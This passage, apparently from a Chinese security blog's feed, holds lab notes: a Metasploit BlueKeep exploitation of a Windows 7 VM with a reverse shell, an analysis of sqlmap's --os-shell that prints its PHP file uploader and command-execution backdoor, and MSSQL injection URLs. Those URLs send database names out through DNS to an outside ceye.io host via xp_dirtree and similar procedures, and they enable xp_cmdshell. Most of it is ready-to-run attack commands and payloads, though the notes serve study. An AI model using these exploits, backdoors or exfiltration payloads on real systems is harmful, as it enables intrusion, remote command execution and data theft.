读取win系统注册表</span></span><br></pre></td></tr></table></figure><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p><code>WAF</code> : Web 应用防护系统，主要是对 Web 特有入侵方式的加强防护。只能防御固有特征的漏洞，无法防御逻辑漏洞/ CSRF 漏洞/SSRF 漏洞</p><p>![](/images/197WAF 分类.png)</p><h4 id="WAF-工作流程"><a href="#WAF-工作流程" class="headerlink" title="WAF 工作流程"></a>WAF 工作流程</h4><p><img src="/images/197WAF%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png" alt></p><h4 id="常见过-WAF技巧"><a href="#常见过-WAF技巧" class="headerlink" title="常见过 WAF技巧"></a>常见过 WAF技巧</h4><p><img src="/images/197%E5%B8%B8%E8%A7%81%E8%BF%87WAF%E6%8A%80%E5%B7%A7.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 注入总结，及&lt;code&gt;note38-note40&lt;/code&gt; 笔记整理。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="summary" scheme="http://yoursite.com/tags/summary/"/>
    
      <category term="SQL 注入" scheme="http://yoursite.com/tags/SQL-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>远程桌面代码执行漏洞复现</title>
    <link href="http://yoursite.com/2019/09/07/bluekeep/"/>
    <id>http://yoursite.com/2019/09/07/bluekeep/</id>
    <published>2019-09-07T05:52:37.000Z</published>
    <updated>2019-09-08T14:26:00.844Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 打开 <code>Win7</code> 虚拟机中的远程桌面，利用 <code>Metasploit</code> 进行 <code>bluekeep(CVE-2019-0708)</code>漏洞复现。</p><a id="more"></a><!--export--><!--toc--><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p><code>VMware Workstation 15 Pro</code> + <code>Window 7 Service Pack 1</code> + <code>kail</code></p><h3 id="开启-Win-7-远程桌面"><a href="#开启-Win-7-远程桌面" class="headerlink" title="开启 Win 7 远程桌面"></a>开启 <code>Win 7</code> 远程桌面</h3><p>右击计算机，选择属性，在弹窗左侧选择远程设置，系统属性的远程选项卡中选择远程桌面为：<code>允许运行任意版本远程桌面计算机连接</code> 点击确定。</p><p><img src="/images/195bluekeep1.png" alt></p><p>查看 <code>ip</code> 地址</p><p><img src="/images/195bluekeep3.png" alt></p><h3 id="攻击工具准备"><a href="#攻击工具准备" class="headerlink" title="攻击工具准备"></a>攻击工具准备</h3><h4 id="在-kali-更新-msf"><a href="#在-kali-更新-msf" class="headerlink" title="在 kali 更新 msf"></a>在 <code>kali</code> 更新 <code>msf</code></h4><p>用 <code>leafpad</code> 打开 <code>sorces.list</code>，添加下面源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment">#阿里云kali更新源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment">#163 DEBIAN源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib</span><br></pre></td></tr></table></figure><p>保存后，在终端输入如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure><h4 id="攻击套件准备"><a href="#攻击套件准备" class="headerlink" title="攻击套件准备"></a>攻击套件准备</h4><p>在 <a href="https://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ" target="_blank" rel="noopener">代码下载</a> 提取码: mffr，下载代码，解压后，按它们分别放到如下路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb   -&gt;   /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb   -&gt;   //usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb   -&gt;   //usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb   -&gt;   /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>在 <code>kali</code> 的终端，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole</span></span><br></pre></td></tr></table></figure><p>进入 <code>metasploit-framework</code></p><p><img src="/images/195bluekeep2.png" alt></p><p>进入后，输入 <code>reload_all</code> 重新加载上一步添加的 <code>bluekeep</code> 模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> RHOSTS 192.168.100.48</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> RPORT 3389</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; <span class="built_in">set</span> target 3</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep4.png" alt></p><p><code>Win7</code> 虚拟机会蓝屏</p><p><img src="/images/195bluekeep12.png" alt></p><p>查阅资料，发现应该是没有设置 <code>payload</code> 的原因。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms10_018_ie_behaviors</span><br><span class="line">show payloads</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep5.png" alt></p><p><img src="/images/195bluekeep6.png" alt></p><p>选择 <code>generic/shell_reverse_tcp</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep13.png" alt></p><p>之后，再执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.100.48</span><br><span class="line"><span class="built_in">set</span> RPORT 3389</span><br><span class="line"><span class="built_in">set</span> target 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep8.png" alt></p><p>现在可以执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep9.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep10.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="/images/195bluekeep11.png" alt></p><p><em>参考文章</em></p><blockquote><p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage" target="_blank" rel="noopener">CVE-2019-0708远程桌面代码执行漏洞复现</a></p><p><a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/issues/22" target="_blank" rel="noopener">Exploit completed, no session was created</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 打开 &lt;code&gt;Win7&lt;/code&gt; 虚拟机中的远程桌面，利用 &lt;code&gt;Metasploit&lt;/code&gt; 进行 &lt;code&gt;bluekeep(CVE-2019-0708)&lt;/code&gt;漏洞复现。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>SQL 注入测试</title>
    <link href="http://yoursite.com/2019/09/06/stage2-exam/"/>
    <id>http://yoursite.com/2019/09/06/stage2-exam/</id>
    <published>2019-09-06T11:08:46.000Z</published>
    <updated>2019-09-08T14:50:37.300Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL注入测试</p><a id="more"></a><!--export--><!--toc--><ol><li>Mysql 数据库进行 DNSlog 外带数据时，以下错误的是</li></ol><ul><li><input disabled type="checkbox"> 不可以在 Linux 系统中外带数据</li><li><input disabled type="checkbox"> 可以在 windows 系统中外带数据</li><li><input disabled type="checkbox"> 需要 Mysql 设置 secure_file_priv=’’</li><li><input checked disabled type="checkbox"> 需要 Mysql 设置 secure_file_priv=NULL</li></ul><ol start="2"><li>SQL 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE name=&quot;.$name.&quot; and pass=&quot;.$pass.&quot;</span><br></pre></td></tr></table></figure><p>如何登录</p><ul><li><input disabled type="checkbox"> $name设置值为admin’and’1’=’1’，$pass的值为123456</li><li><input disabled type="checkbox"> $name设置值为admin’and’1’=’1，$pass的值为123456</li><li><input checked disabled type="checkbox"> $name设置值为admin’or’1’=’1，$pass的值为123456</li><li><input disabled type="checkbox"> $name设置值为admin’or’1’=’1’，$pass的值为123456</li></ul><ol start="3"><li>在 php + mysql 网站中，sqlmap 的 –os-shell 功能原理？</li></ol><p>简答：通过 mysql 的 into outfile 或者 into dumpfile 功能，向网站目录中写入 php 代码，用来执行系统命令。</p><p>详细原理描述：</p><ol><li>简单流程</li></ol><p><img src="/images/os_shell.jpg" alt></p><p>由图片，可以看到如下几步：</p><p><img src="/images/os_shell.png" alt></p><ol start="2"><li>流量分析：</li></ol><p>主要 http 流量有 4 条，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x34,1024)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- MBKa&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line"># 根据 @@version_compile_os 首字母判断操作系统</span><br><span class="line">id=1&apos; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT (CASE WHEN (0x57=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- EJbF&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">id=1&apos; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x31,451)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- LNMk&amp;Submit=Submit</span><br><span class="line"># 开始写入文件</span><br><span class="line">id=1&apos; LIMIT 0,1 INTO OUTFILE &apos;/var/www/html/hackable/uploads/2.php&apos; LINES TERMINATED BY 0x3c3f7068702-- -&amp;Submit=Submit</span><br></pre></td></tr></table></figure><p>判断操作系统后，开始写入文件，sqlmap 按路径尝试去访问文件 <code>tmpujqbu.php</code>，通过 POST 上传后门文件 <code>tmpbzhga.php</code>。</p><p><img src="/images/os_shell1.jpg" alt></p><ol start="3"><li>文件内容解析</li></ol><p><img src="/images/os_shell2.jpg" alt></p><p><code>tmpujqbu.php</code> 中的内容就是一个简单的文件上传，并且目标文件的权限设置为 0755，注意这个文件生成利用的 <code>LINES TERMINATED BY</code> ，所以前面会带上 SQL 执行的结果。这里就是 <code>admin admin</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tmpujqbu.php</span></span><br><span class="line">admin    admin</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    $dir = $_REQUEST[<span class="string">"uploadDir"</span>];</span><br><span class="line">    <span class="keyword">if</span> (phpversion() &lt; <span class="string">'4.1.0'</span>) &#123;</span><br><span class="line">        $file = $HTTP_POST_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        @move_uploaded_file($HTTP_POST_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dir . <span class="string">"/"</span> . $file) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $file = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        @move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dir . <span class="string">"/"</span> . $file) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    @chmod($dir . <span class="string">"/"</span> . $file, <span class="number">0755</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploaded"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;form action="</span> . $_SERVER[<span class="string">"PHP_SELF"</span>] . <span class="string">" method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=/var/www/html/hackable/uploads/&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;"</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而 <code>tmpbzhga.php</code> 可以看到就是一个标准用于执行系统命令的后门脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">    $w = shell_exec($c);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    passthru($c);</span><br><span class="line">    $w = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">    $x = popen($c, r);</span><br><span class="line">    $w = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_resource($x)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!feof($x)) &#123;</span><br><span class="line">            $w.= fread($x, <span class="number">512</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @pclose($x);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (f(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">    $w = <span class="keyword">array</span>();</span><br><span class="line">    exec($c, $w);</span><br><span class="line">    $w = join(chr(<span class="number">10</span>) , $w) . chr(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $w = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span> . $w . <span class="string">"&lt;/pre&gt;"</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问并执行 <code>ls</code> 命令。</p><p><img src="/images/os_shell3.jpg" alt></p><h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ol><li><p>原理简述</p><p>通过 MySQL 的 into outfile 和 into dumpfile 向网站目录下写入 php 代码，用来执行系统命令。</p></li><li><p>使用 <code>--os-shell</code> 需要条件</p><ul><li>FILE 权限</li><li>可写的绝对路径</li><li>PHP GPC OFF</li></ul></li><li><p><code>--os-shell</code> 退出后发生什么</p><p>会调用后门脚本删除上传文件后，进行自删除。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL注入测试&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL注入测试" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>练习14</title>
    <link href="http://yoursite.com/2019/09/04/practice14/"/>
    <id>http://yoursite.com/2019/09/04/practice14/</id>
    <published>2019-09-04T10:48:00.000Z</published>
    <updated>2019-09-09T05:53:39.326Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 利用<code>mssql</code> 数据库的 <code>dnslog</code> 外带数据的方式进行注入，查询出库名表名；利用 <code>mysql</code> 数据库在 <code>windows</code> 系统中 <code>dnslog</code> 外带数据进行注入。</p><a id="more"></a><!--export--><!--toc--><h3 id="Mssql-的-dnslog-外带数据注入"><a href="#Mssql-的-dnslog-外带数据注入" class="headerlink" title="Mssql 的 dnslog 外带数据注入"></a><code>Mssql</code> 的 <code>dnslog</code> 外带数据注入</h3><h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><p>查总个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select count(name) from master.dbo.sysdatabases );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog10.png" alt></p><p><img src="/images/193dnslog11.png" alt></p><p>查第一个库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=1 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog12.png" alt></p><p><img src="/images/193dnslog13.png" alt></p><p>查询第二个库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=2 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog15.png" alt></p><p><img src="/images/193dnslog14.png" alt></p><p>全部库名如下图所示：</p><p><img src="/images/193dnslog16.png" alt></p><p>八个库分别为：<code>master</code>，<code>tempdb</code>，<code>model</code>，<code>msdb</code>，<code>ReportServer</code>，<code>aspcms</code>，<code>ReportServerTempDB</code> 和 <code>test</code>。</p><h4 id="查询库-test-中的表名"><a href="#查询库-test-中的表名" class="headerlink" title="查询库 test 中的表名"></a>查询库 <code>test</code> 中的表名</h4><p>先查看个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select count(Name) FROM test.dbo.SysObjects Where XType=&apos;U&apos; );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog8.png" alt></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C193dnslog9.png" alt></p><p>总共四个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos;);exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog2.png" alt></p><p><img src="/images/193dnslog3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (&apos;emails&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog4.png" alt></p><p><img src="/images/193dnslog5.png" alt></p><p>关于如何取下一个表名，还有一种更巧妙的方法，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (select top 3 name from test.dbo.SysObjects Where XType=&apos;U&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog6.png" alt></p><p><img src="/images/193dnslog7.png" alt></p><p>可知，这四个表分别为：<code>emails</code>，<code>users</code>，<code>uagents</code> 和 <code>referers</code>。</p><h4 id="查询-users-表中的列名"><a href="#查询-users-表中的列名" class="headerlink" title="查询 users 表中的列名"></a>查询 <code>users</code> 表中的列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog17.png" alt></p><p><img src="/images/193dnslog18.png" alt></p><p>依次执行下面命令，可以查的所有的列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p>列名分别为 ：<code>id</code>，<code>username</code> 和 <code>password</code>。</p><p><img src="/images/193dnslog19.png" alt></p><h4 id="使用-xp-subdirs"><a href="#使用-xp-subdirs" class="headerlink" title="使用 xp_subdirs"></a>使用 <code>xp_subdirs</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_subdirs &quot;//&apos; %2b @a %2b &apos;.subdirs.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog20.png" alt></p><p><img src="/images/193dnslog21.png" alt></p><h4 id="使用-xp-fileexist"><a href="#使用-xp-fileexist" class="headerlink" title="使用 xp_fileexist"></a>使用 <code>xp_fileexist</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_fileexist &quot;//&apos; %2b @a %2b &apos;.fileexist.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog23.png" alt></p><p><img src="/images/193dnslog22.png" alt></p><h4 id="使用-xp-cmdshell"><a href="#使用-xp-cmdshell" class="headerlink" title="使用 xp_cmdshell"></a>使用 <code>xp_cmdshell</code></h4><p>现在数据库中打开 <code>xp_cmdshell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog24.png" alt></p><p>先在数据库中执行下面命令，看是否正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=&apos;www.baidu.com&apos;;</span><br><span class="line">exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);</span><br><span class="line">reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);</span><br><span class="line">reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; + @a + 